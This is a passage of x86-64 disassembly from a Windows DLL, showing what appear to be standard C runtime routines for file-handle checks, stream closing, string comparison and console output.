   18000c761:	48 8b d9             	mov    %rcx,%rbx
   18000c764:	c1 e8 0d             	shr    $0xd,%eax
   18000c767:	90                   	nop
   18000c768:	a8 01                	test   $0x1,%al
   18000c76a:	74 28                	je     0x18000c794
   18000c76c:	8b 41 14             	mov    0x14(%rcx),%eax
   18000c76f:	90                   	nop
   18000c770:	c1 e8 06             	shr    $0x6,%eax
   18000c773:	a8 01                	test   $0x1,%al
   18000c775:	74 1d                	je     0x18000c794
   18000c777:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   18000c77b:	e8 f0 a2 ff ff       	call   0x180006a70
   18000c780:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   18000c787:	ff 
   18000c788:	33 c0                	xor    %eax,%eax
   18000c78a:	48 89 43 08          	mov    %rax,0x8(%rbx)
   18000c78e:	48 89 03             	mov    %rax,(%rbx)
   18000c791:	89 43 10             	mov    %eax,0x10(%rbx)
   18000c794:	48 83 c4 20          	add    $0x20,%rsp
   18000c798:	5b                   	pop    %rbx
   18000c799:	c3                   	ret
   18000c79a:	cc                   	int3
   18000c79b:	cc                   	int3
   18000c79c:	48 83 ec 28          	sub    $0x28,%rsp
   18000c7a0:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000c7a3:	75 0d                	jne    0x18000c7b2
   18000c7a5:	e8 4a 99 ff ff       	call   0x1800060f4
   18000c7aa:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c7b0:	eb 42                	jmp    0x18000c7f4
   18000c7b2:	85 c9                	test   %ecx,%ecx
   18000c7b4:	78 2e                	js     0x18000c7e4
   18000c7b6:	3b 0d 14 ed 00 00    	cmp    0xed14(%rip),%ecx        # 0x18001b4d0
   18000c7bc:	73 26                	jae    0x18000c7e4
   18000c7be:	48 63 c9             	movslq %ecx,%rcx
   18000c7c1:	48 8d 15 08 e9 00 00 	lea    0xe908(%rip),%rdx        # 0x18001b0d0
   18000c7c8:	48 8b c1             	mov    %rcx,%rax
   18000c7cb:	83 e1 3f             	and    $0x3f,%ecx
   18000c7ce:	48 c1 e8 06          	shr    $0x6,%rax
   18000c7d2:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000c7d6:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   18000c7da:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   18000c7df:	83 e0 40             	and    $0x40,%eax
   18000c7e2:	eb 12                	jmp    0x18000c7f6
   18000c7e4:	e8 0b 99 ff ff       	call   0x1800060f4
   18000c7e9:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c7ef:	e8 58 97 ff ff       	call   0x180005f4c
   18000c7f4:	33 c0                	xor    %eax,%eax
   18000c7f6:	48 83 c4 28          	add    $0x28,%rsp
   18000c7fa:	c3                   	ret
   18000c7fb:	cc                   	int3
   18000c7fc:	48 83 22 00          	andq   $0x0,(%rdx)
   18000c800:	48 8b c1             	mov    %rcx,%rax
   18000c803:	c3                   	ret
   18000c804:	48 83 21 00          	andq   $0x0,(%rcx)
   18000c808:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000c80c:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   18000c810:	c7 42 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rdx)
   18000c817:	c3                   	ret
   18000c818:	cc                   	int3
   18000c819:	cc                   	int3
   18000c81a:	cc                   	int3
   18000c81b:	cc                   	int3
   18000c81c:	cc                   	int3
   18000c81d:	cc                   	int3
   18000c81e:	cc                   	int3
   18000c81f:	cc                   	int3
   18000c820:	4d 8b c8             	mov    %r8,%r9
   18000c823:	4c 8b da             	mov    %rdx,%r11
   18000c826:	4c 8b d1             	mov    %rcx,%r10
   18000c829:	4d 85 c0             	test   %r8,%r8
   18000c82c:	75 12                	jne    0x18000c840
   18000c82e:	33 c0                	xor    %eax,%eax
   18000c830:	c3                   	ret
   18000c831:	0f 1f 40 00          	nopl   0x0(%rax)
   18000c835:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000c83c:	00 00 00 00 
   18000c840:	41 0f b7 0a          	movzwl (%r10),%ecx
   18000c844:	4d 8d 52 02          	lea    0x2(%r10),%r10
   18000c848:	45 0f b7 03          	movzwl (%r11),%r8d
   18000c84c:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   18000c850:	41 3b c8             	cmp    %r8d,%ecx
   18000c853:	74 20                	je     0x18000c875
   18000c855:	8d 41 bf             	lea    -0x41(%rcx),%eax
   18000c858:	83 f8 19             	cmp    $0x19,%eax
   18000c85b:	8d 51 20             	lea    0x20(%rcx),%edx
   18000c85e:	41 8d 40 bf          	lea    -0x41(%r8),%eax
   18000c862:	0f 47 d1             	cmova  %ecx,%edx
   18000c865:	83 f8 19             	cmp    $0x19,%eax
   18000c868:	8b ca                	mov    %edx,%ecx
   18000c86a:	41 8d 50 20          	lea    0x20(%r8),%edx
   18000c86e:	41 0f 47 d0          	cmova  %r8d,%edx
   18000c872:	44 8b c2             	mov    %edx,%r8d
   18000c875:	8b c1                	mov    %ecx,%eax
   18000c877:	41 2b c0             	sub    %r8d,%eax
   18000c87a:	75 0a                	jne    0x18000c886
   18000c87c:	85 c9                	test   %ecx,%ecx
   18000c87e:	74 06                	je     0x18000c886
   18000c880:	49 83 e9 01          	sub    $0x1,%r9
   18000c884:	75 ba                	jne    0x18000c840
   18000c886:	c3                   	ret
   18000c887:	cc                   	int3
   18000c888:	48 83 ec 28          	sub    $0x28,%rsp
   18000c88c:	48 8b 05 b5 29 00 00 	mov    0x29b5(%rip),%rax        # 0x18000f248
   18000c893:	ff d0                	call   *%rax
   18000c895:	0f 1f 00             	nopl   (%rax)
   18000c898:	48 83 c4 28          	add    $0x28,%rsp
   18000c89c:	c3                   	ret
   18000c89d:	cc                   	int3
   18000c89e:	cc                   	int3
   18000c89f:	cc                   	int3
   18000c8a0:	33 c0                	xor    %eax,%eax
   18000c8a2:	38 01                	cmp    %al,(%rcx)
   18000c8a4:	74 0e                	je     0x18000c8b4
   18000c8a6:	48 3b c2             	cmp    %rdx,%rax
   18000c8a9:	74 09                	je     0x18000c8b4
   18000c8ab:	48 ff c0             	inc    %rax
   18000c8ae:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   18000c8b2:	75 f2                	jne    0x18000c8a6
   18000c8b4:	c3                   	ret
   18000c8b5:	cc                   	int3
   18000c8b6:	cc                   	int3
   18000c8b7:	cc                   	int3
   18000c8b8:	8b 05 86 ec 00 00    	mov    0xec86(%rip),%eax        # 0x18001b544
   18000c8be:	c3                   	ret
   18000c8bf:	cc                   	int3
   18000c8c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c8c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000c8ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000c8cf:	57                   	push   %rdi
   18000c8d0:	48 83 ec 30          	sub    $0x30,%rsp
   18000c8d4:	48 63 f9             	movslq %ecx,%rdi
   18000c8d7:	49 8b d9             	mov    %r9,%rbx
   18000c8da:	8b cf                	mov    %edi,%ecx
   18000c8dc:	41 8b f0             	mov    %r8d,%esi
   18000c8df:	48 8b ea             	mov    %rdx,%rbp
   18000c8e2:	e8 a9 ef ff ff       	call   0x18000b890
   18000c8e7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000c8eb:	75 11                	jne    0x18000c8fe
   18000c8ed:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   18000c8f1:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   18000c8f8:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000c8fc:	eb 5c                	jmp    0x18000c95a
   18000c8fe:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000c904:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000c909:	44 8b ce             	mov    %esi,%r9d
   18000c90c:	48 8b d5             	mov    %rbp,%rdx
   18000c90f:	48 8b c8             	mov    %rax,%rcx
   18000c912:	ff 15 10 29 00 00    	call   *0x2910(%rip)        # 0x18000f228
   18000c918:	85 c0                	test   %eax,%eax
   18000c91a:	75 12                	jne    0x18000c92e
   18000c91c:	ff 15 4e 27 00 00    	call   *0x274e(%rip)        # 0x18000f070
   18000c922:	8b c8                	mov    %eax,%ecx
   18000c924:	48 8b d3             	mov    %rbx,%rdx
   18000c927:	e8 80 97 ff ff       	call   0x1800060ac
   18000c92c:	eb ca                	jmp    0x18000c8f8
   18000c92e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000c933:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000c937:	74 bf                	je     0x18000c8f8
   18000c939:	48 8b d7             	mov    %rdi,%rdx
   18000c93c:	4c 8d 05 8d e7 00 00 	lea    0xe78d(%rip),%r8        # 0x18001b0d0
   18000c943:	83 e2 3f             	and    $0x3f,%edx
   18000c946:	48 8b cf             	mov    %rdi,%rcx
   18000c949:	48 c1 f9 06          	sar    $0x6,%rcx
   18000c94d:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000c951:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   18000c955:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   18000c95a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000c95f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000c964:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   18000c969:	48 83 c4 30          	add    $0x30,%rsp
   18000c96d:	5f                   	pop    %rdi
   18000c96e:	c3                   	ret
   18000c96f:	cc                   	int3
   18000c970:	e9 4b ff ff ff       	jmp    0x18000c8c0
   18000c975:	cc                   	int3
   18000c976:	cc                   	int3
   18000c977:	cc                   	int3
   18000c978:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   18000c97d:	48 83 ec 28          	sub    $0x28,%rsp
   18000c981:	e8 fa 01 00 00       	call   0x18000cb80
   18000c986:	85 c0                	test   %eax,%eax
   18000c988:	74 24                	je     0x18000c9ae
   18000c98a:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   18000c98f:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   18000c994:	ba 01 00 00 00       	mov    $0x1,%edx
   18000c999:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000c99e:	e8 4d 02 00 00       	call   0x18000cbf0
   18000c9a3:	85 c0                	test   %eax,%eax
   18000c9a5:	74 07                	je     0x18000c9ae
   18000c9a7:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   18000c9ac:	eb 05                	jmp    0x18000c9b3
   18000c9ae:	b8 ff ff 00 00       	mov    $0xffff,%eax
   18000c9b3:	48 83 c4 28          	add    $0x28,%rsp
   18000c9b7:	c3                   	ret
   18000c9b8:	48 8b c4             	mov    %rsp,%rax
   18000c9bb:	48 89 58 10          	mov    %rbx,0x10(%rax)
   18000c9bf:	48 89 48 08          	mov    %rcx,0x8(%rax)
   18000c9c3:	57                   	push   %rdi
   18000c9c4:	48 83 ec 30          	sub    $0x30,%rsp
   18000c9c8:	48 8b fa             	mov    %rdx,%rdi
   18000c9cb:	48 8b d9             	mov    %rcx,%rbx
   18000c9ce:	48 85 c9             	test   %rcx,%rcx
   18000c9d1:	75 2e                	jne    0x18000ca01
   18000c9d3:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   18000c9d7:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   18000c9de:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   18000c9e2:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   18000c9e6:	45 33 c9             	xor    %r9d,%r9d
   18000c9e9:	45 33 c0             	xor    %r8d,%r8d
   18000c9ec:	33 d2                	xor    %edx,%edx
   18000c9ee:	e8 a1 94 ff ff       	call   0x180005e94
   18000c9f3:	83 c8 ff             	or     $0xffffffff,%eax
   18000c9f6:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   18000c9fb:	48 83 c4 30          	add    $0x30,%rsp
   18000c9ff:	5f                   	pop    %rdi
   18000ca00:	c3                   	ret
   18000ca01:	8b 41 14             	mov    0x14(%rcx),%eax
   18000ca04:	90                   	nop
   18000ca05:	c1 e8 0c             	shr    $0xc,%eax
   18000ca08:	24 01                	and    $0x1,%al
   18000ca0a:	74 07                	je     0x18000ca13
   18000ca0c:	e8 ab 04 00 00       	call   0x18000cebc
   18000ca11:	eb e0                	jmp    0x18000c9f3
   18000ca13:	e8 b4 cd ff ff       	call   0x1800097cc
   18000ca18:	90                   	nop
   18000ca19:	48 8b d7             	mov    %rdi,%rdx
   18000ca1c:	48 8b cb             	mov    %rbx,%rcx
   18000ca1f:	e8 10 00 00 00       	call   0x18000ca34
   18000ca24:	8b f8                	mov    %eax,%edi
   18000ca26:	48 8b cb             	mov    %rbx,%rcx
   18000ca29:	e8 aa cd ff ff       	call   0x1800097d8
   18000ca2e:	8b c7                	mov    %edi,%eax
   18000ca30:	eb c4                	jmp    0x18000c9f6
   18000ca32:	cc                   	int3
   18000ca33:	cc                   	int3
   18000ca34:	48 8b c4             	mov    %rsp,%rax
   18000ca37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000ca3b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   18000ca3f:	57                   	push   %rdi
   18000ca40:	48 83 ec 30          	sub    $0x30,%rsp
   18000ca44:	48 8b fa             	mov    %rdx,%rdi
   18000ca47:	48 8b d9             	mov    %rcx,%rbx
   18000ca4a:	48 85 c9             	test   %rcx,%rcx
   18000ca4d:	75 25                	jne    0x18000ca74
   18000ca4f:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   18000ca53:	45 33 c9             	xor    %r9d,%r9d
   18000ca56:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   18000ca5a:	45 33 c0             	xor    %r8d,%r8d
   18000ca5d:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   18000ca61:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   18000ca68:	33 d2                	xor    %edx,%edx
   18000ca6a:	e8 25 94 ff ff       	call   0x180005e94
   18000ca6f:	83 c8 ff             	or     $0xffffffff,%eax
   18000ca72:	eb 55                	jmp    0x18000cac9
   18000ca74:	8b 41 14             	mov    0x14(%rcx),%eax
   18000ca77:	83 ce ff             	or     $0xffffffff,%esi
   18000ca7a:	c1 e8 0d             	shr    $0xd,%eax
   18000ca7d:	90                   	nop
   18000ca7e:	a8 01                	test   $0x1,%al
   18000ca80:	74 3d                	je     0x18000cabf
   18000ca82:	e8 61 ca ff ff       	call   0x1800094e8
   18000ca87:	48 8b cb             	mov    %rbx,%rcx
   18000ca8a:	8b f0                	mov    %eax,%esi
   18000ca8c:	e8 c7 fc ff ff       	call   0x18000c758
   18000ca91:	48 8b cb             	mov    %rbx,%rcx
   18000ca94:	e8 27 d3 ff ff       	call   0x180009dc0
   18000ca99:	8b c8                	mov    %eax,%ecx
   18000ca9b:	48 8b d7             	mov    %rdi,%rdx
   18000ca9e:	e8 85 02 00 00       	call   0x18000cd28
   18000caa3:	85 c0                	test   %eax,%eax
   18000caa5:	79 05                	jns    0x18000caac
   18000caa7:	83 ce ff             	or     $0xffffffff,%esi
   18000caaa:	eb 13                	jmp    0x18000cabf
   18000caac:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000cab0:	48 85 c9             	test   %rcx,%rcx
   18000cab3:	74 0a                	je     0x18000cabf
   18000cab5:	e8 b6 9f ff ff       	call   0x180006a70
   18000caba:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   18000cabf:	48 8b cb             	mov    %rbx,%rcx
   18000cac2:	e8 f5 03 00 00       	call   0x18000cebc
   18000cac7:	8b c6                	mov    %esi,%eax
   18000cac9:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000cace:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000cad3:	48 83 c4 30          	add    $0x30,%rsp
   18000cad7:	5f                   	pop    %rdi
   18000cad8:	c3                   	ret
   18000cad9:	cc                   	int3
   18000cada:	cc                   	int3
   18000cadb:	cc                   	int3
   18000cadc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cae1:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000cae6:	55                   	push   %rbp
   18000cae7:	48 8b ec             	mov    %rsp,%rbp
   18000caea:	48 83 ec 60          	sub    $0x60,%rsp
   18000caee:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   18000caf3:	83 3d 5a e2 00 00 00 	cmpl   $0x0,0xe25a(%rip)        # 0x18001ad54
   18000cafa:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   18000cafe:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   18000cb02:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   18000cb06:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   18000cb0a:	75 10                	jne    0x18000cb1c
   18000cb0c:	0f 10 05 e5 d6 00 00 	movups 0xd6e5(%rip),%xmm0        # 0x18001a1f8
   18000cb13:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   18000cb17:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   18000cb1c:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   18000cb20:	e8 93 fe ff ff       	call   0x18000c9b8
   18000cb25:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   18000cb29:	8b f8                	mov    %eax,%edi
   18000cb2b:	75 0b                	jne    0x18000cb38
   18000cb2d:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   18000cb31:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000cb38:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   18000cb3c:	74 0f                	je     0x18000cb4d
   18000cb3e:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   18000cb41:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   18000cb45:	e8 86 8f ff ff       	call   0x180005ad0
   18000cb4a:	89 58 20             	mov    %ebx,0x20(%rax)
   18000cb4d:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   18000cb51:	74 0f                	je     0x18000cb62
   18000cb53:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   18000cb56:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   18000cb5a:	e8 71 8f ff ff       	call   0x180005ad0
   18000cb5f:	89 58 24             	mov    %ebx,0x24(%rax)
   18000cb62:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000cb67:	8b c7                	mov    %edi,%eax
   18000cb69:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   18000cb6e:	48 83 c4 60          	add    $0x60,%rsp
   18000cb72:	5d                   	pop    %rbp
   18000cb73:	c3                   	ret
   18000cb74:	cc                   	int3
   18000cb75:	cc                   	int3
   18000cb76:	cc                   	int3
   18000cb77:	cc                   	int3
   18000cb78:	cc                   	int3
   18000cb79:	cc                   	int3
   18000cb7a:	cc                   	int3
   18000cb7b:	cc                   	int3
   18000cb7c:	cc                   	int3
   18000cb7d:	cc                   	int3
   18000cb7e:	cc                   	int3
   18000cb7f:	cc                   	int3
   18000cb80:	40 53                	rex push %rbx
   18000cb82:	48 83 ec 40          	sub    $0x40,%rsp
   18000cb86:	48 8b 05 73 de 00 00 	mov    0xde73(%rip),%rax        # 0x18001aa00
   18000cb8d:	33 db                	xor    %ebx,%ebx
   18000cb8f:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   18000cb93:	75 2e                	jne    0x18000cbc3
   18000cb95:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000cb9a:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   18000cb9e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   18000cba2:	48 8d 0d c7 83 00 00 	lea    0x83c7(%rip),%rcx        # 0x180014f70
   18000cba9:	45 33 c9             	xor    %r9d,%r9d
   18000cbac:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   18000cbb1:	ba 00 00 00 40       	mov    $0x40000000,%edx
   18000cbb6:	ff 15 74 26 00 00    	call   *0x2674(%rip)        # 0x18000f230
   18000cbbc:	48 89 05 3d de 00 00 	mov    %rax,0xde3d(%rip)        # 0x18001aa00
   18000cbc3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000cbc7:	0f 95 c3             	setne  %bl
   18000cbca:	8b c3                	mov    %ebx,%eax
   18000cbcc:	48 83 c4 40          	add    $0x40,%rsp
   18000cbd0:	5b                   	pop    %rbx
   18000cbd1:	c3                   	ret
   18000cbd2:	cc                   	int3
   18000cbd3:	cc                   	int3
   18000cbd4:	48 83 ec 28          	sub    $0x28,%rsp
   18000cbd8:	48 8b 0d 21 de 00 00 	mov    0xde21(%rip),%rcx        # 0x18001aa00
   18000cbdf:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   18000cbe3:	77 06                	ja     0x18000cbeb
   18000cbe5:	ff 15 4d 26 00 00    	call   *0x264d(%rip)        # 0x18000f238
   18000cbeb:	48 83 c4 28          	add    $0x28,%rsp
   18000cbef:	c3                   	ret
   18000cbf0:	48 8b c4             	mov    %rsp,%rax
   18000cbf3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000cbf7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000cbfb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000cbff:	57                   	push   %rdi
   18000cc00:	48 83 ec 40          	sub    $0x40,%rsp
   18000cc04:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   18000cc09:	49 8b f8             	mov    %r8,%rdi
   18000cc0c:	4d 8b c8             	mov    %r8,%r9
   18000cc0f:	8b f2                	mov    %edx,%esi
   18000cc11:	44 8b c2             	mov    %edx,%r8d
   18000cc14:	48 8b e9             	mov    %rcx,%rbp
   18000cc17:	48 8b d1             	mov    %rcx,%rdx
   18000cc1a:	48 8b 0d df dd 00 00 	mov    0xdddf(%rip),%rcx        # 0x18001aa00
   18000cc21:	ff 15 f1 23 00 00    	call   *0x23f1(%rip)        # 0x18000f018
   18000cc27:	8b d8                	mov    %eax,%ebx
   18000cc29:	85 c0                	test   %eax,%eax
   18000cc2b:	75 6a                	jne    0x18000cc97
   18000cc2d:	ff 15 3d 24 00 00    	call   *0x243d(%rip)        # 0x18000f070
   18000cc33:	83 f8 06             	cmp    $0x6,%eax
   18000cc36:	75 5f                	jne    0x18000cc97
   18000cc38:	48 8b 0d c1 dd 00 00 	mov    0xddc1(%rip),%rcx        # 0x18001aa00
   18000cc3f:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   18000cc43:	77 06                	ja     0x18000cc4b
   18000cc45:	ff 15 ed 25 00 00    	call   *0x25ed(%rip)        # 0x18000f238
   18000cc4b:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000cc51:	48 8d 0d 18 83 00 00 	lea    0x8318(%rip),%rcx        # 0x180014f70
   18000cc58:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000cc5d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   18000cc63:	45 33 c9             	xor    %r9d,%r9d
   18000cc66:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   18000cc6b:	ba 00 00 00 40       	mov    $0x40000000,%edx
   18000cc70:	ff 15 ba 25 00 00    	call   *0x25ba(%rip)        # 0x18000f230
   18000cc76:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000cc7c:	4c 8b cf             	mov    %rdi,%r9
   18000cc7f:	48 8b c8             	mov    %rax,%rcx
   18000cc82:	48 89 05 77 dd 00 00 	mov    %rax,0xdd77(%rip)        # 0x18001aa00
   18000cc89:	44 8b c6             	mov    %esi,%r8d
   18000cc8c:	48 8b d5             	mov    %rbp,%rdx
   18000cc8f:	ff 15 83 23 00 00    	call   *0x2383(%rip)        # 0x18000f018
   18000cc95:	8b d8                	mov    %eax,%ebx
   18000cc97:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000cc9c:	8b c3                	mov    %ebx,%eax
   18000cc9e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000cca3:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   18000cca8:	48 83 c4 40          	add    $0x40,%rsp
   18000ccac:	5f                   	pop    %rdi
   18000ccad:	c3                   	ret
   18000ccae:	cc                   	int3
   18000ccaf:	cc                   	int3
   18000ccb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ccb5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000ccba:	57                   	push   %rdi
   18000ccbb:	48 83 ec 20          	sub    $0x20,%rsp
   18000ccbf:	49 8b f9             	mov    %r9,%rdi
   18000ccc2:	49 8b d8             	mov    %r8,%rbx
   18000ccc5:	8b 0a                	mov    (%rdx),%ecx
   18000ccc7:	e8 b8 ea ff ff       	call   0x18000b784
   18000cccc:	90                   	nop
   18000cccd:	48 8b 03             	mov    (%rbx),%rax
   18000ccd0:	48 63 08             	movslq (%rax),%rcx
   18000ccd3:	4c 8b d1             	mov    %rcx,%r10
   18000ccd6:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   18000ccda:	48 8b c1             	mov    %rcx,%rax
   18000ccdd:	48 c1 f8 06          	sar    $0x6,%rax
   18000cce1:	4c 8d 0d e8 e3 00 00 	lea    0xe3e8(%rip),%r9        # 0x18001b0d0
   18000cce8:	41 83 e2 3f          	and    $0x3f,%r10d
   18000ccec:	4f 8d 04 d2          	lea    (%r10,%r10,8),%r8
   18000ccf0:	49 8b 04 c1          	mov    (%r9,%rax,8),%rax
   18000ccf4:	42 f6 44 c0 38 01    	testb  $0x1,0x38(%rax,%r8,8)
   18000ccfa:	74 09                	je     0x18000cd05
   18000ccfc:	e8 eb 00 00 00       	call   0x18000cdec
   18000cd01:	8b d8                	mov    %eax,%ebx
   18000cd03:	eb 0e                	jmp    0x18000cd13
   18000cd05:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   18000cd09:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   18000cd10:	83 cb ff             	or     $0xffffffff,%ebx
   18000cd13:	8b 0f                	mov    (%rdi),%ecx
   18000cd15:	e8 92 ea ff ff       	call   0x18000b7ac
   18000cd1a:	8b c3                	mov    %ebx,%eax
   18000cd1c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000cd21:	48 83 c4 20          	add    $0x20,%rsp
   18000cd25:	5f                   	pop    %rdi
   18000cd26:	c3                   	ret
   18000cd27:	cc                   	int3
   18000cd28:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000cd2c:	48 83 ec 58          	sub    $0x58,%rsp
   18000cd30:	4c 63 c1             	movslq %ecx,%r8
   18000cd33:	45 33 c9             	xor    %r9d,%r9d
   18000cd36:	41 83 f8 fe          	cmp    $0xfffffffe,%r8d
   18000cd3a:	75 18                	jne    0x18000cd54
   18000cd3c:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   18000cd40:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   18000cd44:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   18000cd48:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   18000cd4f:	e9 8d 00 00 00       	jmp    0x18000cde1
   18000cd54:	85 c9                	test   %ecx,%ecx
   18000cd56:	78 60                	js     0x18000cdb8
   18000cd58:	44 3b 05 71 e7 00 00 	cmp    0xe771(%rip),%r8d        # 0x18001b4d0
   18000cd5f:	73 57                	jae    0x18000cdb8
   18000cd61:	49 8b c8             	mov    %r8,%rcx
   18000cd64:	4c 8d 15 65 e3 00 00 	lea    0xe365(%rip),%r10        # 0x18001b0d0
   18000cd6b:	83 e1 3f             	and    $0x3f,%ecx
   18000cd6e:	49 8b c0             	mov    %r8,%rax
   18000cd71:	48 c1 f8 06          	sar    $0x6,%rax
   18000cd75:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000cd79:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   18000cd7d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   18000cd82:	74 34                	je     0x18000cdb8
   18000cd84:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   18000cd89:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   18000cd8e:	44 89 44 24 78       	mov    %r8d,0x78(%rsp)
   18000cd93:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000cd98:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   18000cd9d:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   18000cda2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   18000cda7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000cdac:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   18000cdb1:	e8 fa fe ff ff       	call   0x18000ccb0
   18000cdb6:	eb 2c                	jmp    0x18000cde4
   18000cdb8:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   18000cdbc:	45 33 c0             	xor    %r8d,%r8d
   18000cdbf:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   18000cdc3:	33 c9                	xor    %ecx,%ecx
   18000cdc5:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   18000cdc9:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
